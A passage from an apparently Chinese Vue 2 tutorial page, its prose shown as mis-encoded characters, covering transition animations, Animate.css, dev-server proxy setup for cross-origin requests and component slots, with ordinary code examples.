è¿›å…¥çš„æ ·å¼ï¼š<ol><li>v-enterï¼šè¿›å…¥çš„èµ·ç‚¹</li><li>v-enter-activeï¼šè¿›å…¥è¿‡ç¨‹ä¸­</li><li>v-enter-toï¼šè¿›å…¥çš„ç»ˆç‚¹</li></ol></li><li>å…ƒç´ ç¦»å¼€çš„æ ·å¼ï¼š<ol><li>v-leaveï¼šç¦»å¼€çš„èµ·ç‚¹</li><li>v-leave-activeï¼šç¦»å¼€è¿‡ç¨‹ä¸­</li><li>v-leave-toï¼šç¦»å¼€çš„ç»ˆç‚¹</li></ol></li></ul><ol start="2"><li>ä½¿ç”¨<code>&lt;transition&gt;</code>åŒ…è£¹è¦è¿‡æ¸¡çš„å…ƒç´ ï¼Œå¹¶é…ç½®nameå±æ€§ï¼š</li><li>è¦è®©é¡µé¢ä¸€å¼€å§‹å°±æ˜¾ç¤ºåŠ¨ç”»ï¼Œéœ€è¦æ·»åŠ appear</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">appear</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span>&gt;</span>ä½ å¥½å•Šï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.hello-enter-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: hello <span class="hljs-number">0.5s</span> linear;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.hello-leave-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: hello <span class="hljs-number">0.5s</span> linear reverse;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><br><span class="language-css">  <span class="hljs-keyword">@keyframes</span> hello &#123;</span><br><span class="language-css">    <span class="hljs-selector-tag">from</span>&#123;</span><br><span class="language-css">      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-tag">to</span>&#123;</span><br><span class="language-css">      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0px</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>   </transition><ol start="4"><li><p>å¤‡æ³¨ï¼šè‹¥æœ‰å¤šä¸ªå…ƒç´ éœ€è¦è¿‡åº¦ï¼Œåˆ™éœ€è¦ä½¿ç”¨ï¼š<code>&lt;transition-group&gt;</code>ï¼Œä¸”æ¯ä¸ªå…ƒç´ éƒ½è¦æŒ‡å®š<code>key</code>å€¼ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">appear</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>ä½ å¥½å•Šï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>å°šç¡…è°·ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>â€‹           </p><p>ç¬¬ä¸‰æ–¹åŠ¨ç”»åº“Animate.css</p><blockquote><p>ä½¿ç”¨ç¬¬ä¸‰åº“çš„å…·ä½“æ¡ˆä¾‹ï¼ˆéšä¾¿çœ‹çœ‹ï¼Œè¿™ä¸ªä¸é‡è¦ï¼‰<br>åº“çš„åç§°ï¼šAnimate.css<br>å®‰è£…ï¼šnpm i animate.css<br>å¼•å…¥ï¼šimport â€˜animate.cssâ€™</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isShow = !isShow&quot;</span>&gt;</span>æ˜¾ç¤º/éšè—<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> </span><br><span class="hljs-tag"><span class="hljs-attr">appear</span></span><br><span class="hljs-tag"><span class="hljs-attr">name</span>=<span class="hljs-string">&quot;animate__animated animate__bounce&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">enter-active-class</span>=<span class="hljs-string">&quot;animate__swing&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">leave-active-class</span>=<span class="hljs-string">&quot;animate__backOutUp&quot;</span></span><br><span class="hljs-tag">&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>ä½ å¥½å•Šï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>å°šç¡…è°·ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;animate.css&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Test&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">isShow</span>:<span class="hljs-literal">true</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-9-vueè„šæ‰‹æ¶é…ç½®ä»£ç†"><a href="#2-9-vueè„šæ‰‹æ¶é…ç½®ä»£ç†" class="headerlink" title="2.9 vueè„šæ‰‹æ¶é…ç½®ä»£ç†"></a>2.9 vueè„šæ‰‹æ¶é…ç½®ä»£ç†</h2><p>å¯ä»¥ç”¨æ¥è§£å†³è·¨åŸŸçš„é—®é¢˜  </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124155041846.png" alt="image-20221124155041846"></p><blockquote><p>ajax æ˜¯å‰ç«¯æŠ€æœ¯ï¼Œä½ å¾—æœ‰æµè§ˆå™¨ï¼Œæ‰æœ‰windowå¯¹è±¡ï¼Œæ‰æœ‰xhrï¼Œæ‰èƒ½å‘ajaxè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¹‹é—´é€šä¿¡å°±ç”¨ä¼ ç»Ÿçš„httpè¯·æ±‚å°±è¡Œäº†ã€‚</p></blockquote><p>æœ¬æ¡ˆä¾‹éœ€è¦ä¸‹è½½axiosåº“npm install axios<br>é…ç½®å‚è€ƒæ–‡æ¡£ Vue-Cli devServer.proxy<br>vue.config.js æ˜¯ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœé¡¹ç›®çš„ (å’Œ package.json åŒçº§çš„) æ ¹ç›®å½•ä¸­å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒä¼šè¢« @vue&#x2F;cli-service è‡ªåŠ¨åŠ è½½ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ package.json ä¸­çš„ vue å­—æ®µï¼Œä½†æ˜¯æ³¨æ„è¿™ç§å†™æ³•éœ€è¦ä½ ä¸¥æ ¼éµç…§ JSON çš„æ ¼å¼æ¥å†™</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p> åœ¨vue.config.jsä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>:&#123;<br>    <span class="hljs-attr">proxy</span>:<span class="hljs-string">&quot;http://localhost:5000&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯´æ˜ï¼š</p><pre><code class="hljs">1. ä¼˜ç‚¹ï¼šé…ç½®ç®€å•ï¼Œè¯·æ±‚èµ„æºæ—¶ç›´æ¥å‘ç»™å‰ç«¯ï¼ˆ8080ï¼‰å³å¯ã€‚2. ç¼ºç‚¹ï¼šä¸èƒ½é…ç½®å¤šä¸ªä»£ç†ï¼Œä¸èƒ½çµæ´»çš„æ§åˆ¶è¯·æ±‚æ˜¯å¦èµ°ä»£ç†ã€‚3. å·¥ä½œæ–¹å¼ï¼šè‹¥æŒ‰ç…§ä¸Šè¿°é…ç½®ä»£ç†ï¼Œå½“è¯·æ±‚äº†å‰ç«¯ä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œé‚£ä¹ˆè¯¥è¯·æ±‚ä¼šè½¬å‘ç»™æœåŠ¡å™¨ ï¼ˆä¼˜å…ˆåŒ¹é…å‰ç«¯èµ„æºï¼‰</code></pre><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p> ç¼–å†™vue.config.jsé…ç½®å…·ä½“ä»£ç†è§„åˆ™ï¼š</p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><span class="hljs-attr">devServer</span>: &#123;<br>      <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api1&#x27;</span>: &#123;<span class="hljs-comment">// åŒ¹é…æ‰€æœ‰ä»¥ &#x27;/api1&#x27;å¼€å¤´çš„è¯·æ±‚è·¯å¾„</span><br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<span class="hljs-comment">// ä»£ç†ç›®æ ‡çš„åŸºç¡€è·¯å¾„</span><br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api1&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<span class="hljs-comment">// ä»£ç†å¾€åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å»æ‰ /api1 å‰ç¼€</span><br>        <span class="hljs-attr">ws</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// WebSocket</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <br>      &#125;,<br>      <span class="hljs-string">&#x27;/api2&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api2&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   changeOriginè®¾ç½®ä¸ºtrueæ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚å¤´ä¸­çš„hostä¸ºï¼šlocalhost:5000</span><br><span class="hljs-comment">   changeOriginè®¾ç½®ä¸ºfalseæ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚å¤´ä¸­çš„hostä¸ºï¼šlocalhost:8080</span><br><span class="hljs-comment">   changeOriginé»˜è®¤å€¼ä¸ºtrue</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜ï¼š</p><pre><code class="hljs">1. ä¼˜ç‚¹ï¼šå¯ä»¥é…ç½®å¤šä¸ªä»£ç†ï¼Œä¸”å¯ä»¥çµæ´»çš„æ§åˆ¶è¯·æ±‚æ˜¯å¦èµ°ä»£ç†ã€‚2. ç¼ºç‚¹ï¼šé…ç½®ç•¥å¾®ç¹çï¼Œè¯·æ±‚èµ„æºæ—¶å¿…é¡»åŠ å‰ç¼€ã€‚</code></pre><p>vue.config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">pages</span>: &#123;<br>        <span class="hljs-attr">index</span>: &#123;<br>            <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;src/main.js&#x27;</span>,<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-attr">lintOnSave</span>:<span class="hljs-literal">false</span>,<br>    <span class="hljs-comment">// å¼€å¯ä»£ç†æœåŠ¡å™¨ï¼ˆæ–¹å¼ä¸€ï¼‰</span><br>    <span class="hljs-comment">// devServer: &#123;</span><br>    <span class="hljs-comment">//     proxy:&#x27;http://localhost:5000&#x27;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">//å¼€å¯ä»£ç†æœåŠ¡å™¨ï¼ˆæ–¹å¼äºŒï¼‰</span><br><span class="hljs-attr">devServer</span>: &#123;<br>        <span class="hljs-attr">proxy</span>: &#123;<br>            <span class="hljs-string">&#x27;/api1&#x27;</span>: &#123;<br>                <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<br>                <span class="hljs-attr">pathRewrite</span>:&#123;<span class="hljs-string">&#x27;^/api1&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>                <span class="hljs-comment">// ws: true, //ç”¨äºæ”¯æŒwebsocket,é»˜è®¤å€¼ä¸ºtrue</span><br>                <span class="hljs-comment">// changeOrigin: true //ç”¨äºæ§åˆ¶è¯·æ±‚å¤´ä¸­çš„hostå€¼,é»˜è®¤å€¼ä¸ºtrue</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;/api2&#x27;</span>: &#123;<br>                <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<br>                <span class="hljs-attr">pathRewrite</span>:&#123;<span class="hljs-string">&#x27;^/api2&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;,<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-10-slotæ’æ§½"><a href="#2-10-slotæ’æ§½" class="headerlink" title="2.10 slotæ’æ§½"></a>2.10 slotæ’æ§½</h2><ol><li><p>ä½œç”¨ï¼šè®©çˆ¶ç»„ä»¶å¯ä»¥å‘å­ç»„ä»¶æŒ‡å®šä½ç½®æ’å…¥htmlç»“æ„ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äº <strong>çˆ¶ç»„ä»¶ &#x3D;&#x3D;&#x3D;&gt; å­ç»„ä»¶</strong> ã€‚</p></li><li><p>åˆ†ç±»ï¼šé»˜è®¤æ’æ§½ã€å…·åæ’æ§½ã€ä½œç”¨åŸŸæ’æ§½</p></li><li><p>ä½¿ç”¨æ–¹å¼ï¼š</p><ol><li><p>é»˜è®¤æ’æ§½ï¼š</p><pre><code class="hljs">çˆ¶ç»„ä»¶ä¸­ï¼š        &lt;Category&gt;           &lt;div&gt;htmlç»“æ„1&lt;/div&gt;        &lt;/Category&gt;</code></pre><p>å­ç»„ä»¶ä¸­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- å®šä¹‰æ’æ§½ --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span>æ’æ§½é»˜è®¤å†…å®¹...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹    </p></li><li><p>å…·åæ’æ§½ï¼š</p><p>çˆ¶ç»„ä»¶æŒ‡æ˜æ”¾å…¥å­ç»„ä»¶çš„å“ªä¸ªæ’æ§½<strong>slot&#x3D;â€footerâ€<strong>ï¼Œå¦‚æœæ˜¯templateå¯ä»¥å†™æˆ</strong>v-slot:footer</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html">çˆ¶ç»„ä»¶ä¸­ï¼š<br>        <span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>htmlç»“æ„1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:footer</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>htmlç»“æ„2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br>å­ç»„ä»¶ä¸­ï¼š<br>        <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>               <span class="hljs-comment">&lt;!-- å®šä¹‰æ’æ§½ --&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>æ’æ§½é»˜è®¤å†…å®¹...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span>æ’æ§½é»˜è®¤å†…å®¹...<span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>ä½œç”¨åŸŸæ’æ§½ï¼š</p><ol><li><p>ç†è§£ï¼šæ•°æ®åœ¨ç»„ä»¶çš„è‡ªèº«ï¼ˆå­ç»„ä»¶ï¼‰ï¼Œä½†æ ¹æ®æ•°æ®ç”Ÿæˆçš„ç»“æ„éœ€è¦ç»„ä»¶çš„ä½¿ç”¨è€…ï¼ˆçˆ¶ç»„ä»¶ï¼‰æ¥å†³å®šã€‚ï¼ˆgamesæ•°æ®åœ¨Categoryï¼ˆå­ï¼‰ç»„ä»¶ä¸­ï¼Œä½†ä½¿ç”¨æ•°æ®æ‰€éå†å‡ºæ¥çš„ç»“æ„ç”±Appï¼ˆçˆ¶ï¼‰ç»„ä»¶å†³å®šï¼‰</p></li><li><p>å…·ä½“ç¼–ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html">çˆ¶ç»„ä»¶ä¸­ï¼š<br><span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;scopeData&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- ç”Ÿæˆçš„æ˜¯ulåˆ—è¡¨ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;g in scopeData.games&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">Category</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scopeData&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- ç”Ÿæˆçš„æ˜¯h4æ ‡é¢˜ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;g in scopeData.games&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;g&quot;</span>&gt;</span>&#123;&#123;g&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Category</span>&gt;</span><br>å­ç»„ä»¶ä¸­ï¼š<br>        <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- é€šè¿‡æ•°æ®ç»‘å®šå°±å¯ä»¥æŠŠå­ç»„ä»¶çš„æ•°æ®ä¼ åˆ°çˆ¶ç»„ä»¶ --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:games</span>=<span class="hljs-string">&quot;games&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Category&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;title&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-comment">//æ•°æ®åœ¨å­ç»„ä»¶è‡ªèº«</span></span><br><span class="language-javascript">                <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">games</span>:[<span class="hljs-string">&#x27;çº¢è‰²è­¦æˆ’&#x27;</span>,<span class="hljs-string">&#x27;ç©¿è¶Šç«çº¿&#x27;</span>,<span class="hljs-string">&#x27;åŠ²èˆå›¢&#x27;</span>,<span 